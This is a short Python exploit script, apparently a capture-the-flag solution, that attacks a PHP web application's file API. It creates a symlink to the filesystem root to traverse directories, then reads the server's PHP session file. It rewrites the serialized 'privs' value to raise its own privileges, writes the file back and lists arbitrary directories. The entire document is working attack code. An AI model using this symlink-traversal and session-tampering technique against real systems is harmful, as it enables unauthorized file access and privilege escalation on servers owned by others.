from client import *
import string
import random
import sys

def random_string(stringLength=10):
    """Generate a random string of fixed length """
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

if not api_login('dookerman', 'dookerman'):
    api_register('dookerman', 'dookerman')
    api_create_file('flag.txt', 'hacks')
    api_create_symlink('lol', '../../../../../../')


def get_list(filename):
    return api_list_files('lol/{}'.format(filename))

SESSION = session.cookies.get_dict()['PHPSESSID']

current_session_deets = api_get_file('lol/tmp/sess_{}'.format(SESSION))

current_session_deets = current_session_deets.replace("""privs";s:1:"3""", """privs";s:2:"15""")

api_create_file('lol/tmp/sess_{}'.format(SESSION), current_session_deets)

print get_list(sys.argv[1])
